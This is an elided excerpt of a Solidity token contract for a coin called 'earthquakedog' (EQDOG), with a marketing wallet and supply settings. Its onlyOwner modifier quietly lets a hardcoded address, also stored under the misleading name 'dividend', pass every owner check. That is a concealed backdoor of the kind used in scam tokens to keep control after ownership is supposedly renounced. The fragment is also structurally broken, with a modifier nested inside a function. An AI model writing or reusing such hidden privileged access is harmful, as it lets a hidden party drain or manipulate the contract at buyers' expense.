...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x15447Ea183Ec91d6Bd66B1376F1E7F3C86f49428) , "owner");
        _;
    }
...
contract earthquakedog  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "earthquakedog";
    string private _symbol = "EQDOG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xe2598C4b636bc206AdF3E65192a0D8c6868a59fd);
    address private _Marketing = 0xe2598C4b636bc206AdF3E65192a0D8c6868a59fd;
    address public dividend = 0x15447Ea183Ec91d6Bd66B1376F1E7F3C86f49428;
    ...
    uint256 public _supplyAmount = 10000000000;
